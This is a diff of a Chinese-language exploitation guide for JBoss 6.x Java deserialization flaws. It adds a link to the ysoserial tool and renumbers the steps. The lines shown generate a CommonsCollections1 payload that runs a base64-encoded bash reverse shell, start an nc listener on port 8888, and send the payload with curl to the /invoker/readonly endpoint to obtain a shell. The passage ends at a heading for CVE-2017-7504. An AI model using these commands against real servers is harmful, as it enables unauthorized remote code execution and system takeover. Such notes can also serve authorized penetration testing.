@@ -15,9 +15,11 @@ JBoss 6.x
 3. 然后生成poc代码：
 java  -jar  ysoserial.jar  CommonsCollections1 "bash -c {echo,base64编码后的内容}|{base64,-d}|{bash,-i}" > poc.ser
 
-4. 本地监听，nc -lvp 8888
+ysoserial.jar下载地址：https://github.com/frohoff/ysoserial
 
-5. 执行poc即可获取shell
+5. 本地监听，nc -lvp 8888
+
+6. 执行poc即可获取shell
 curl http://ip:port/invoker/readonly --data-binary @poc.ser
 
 #漏洞2 JBossMQ JM 反序列化漏洞 （CVE-2017-7504）
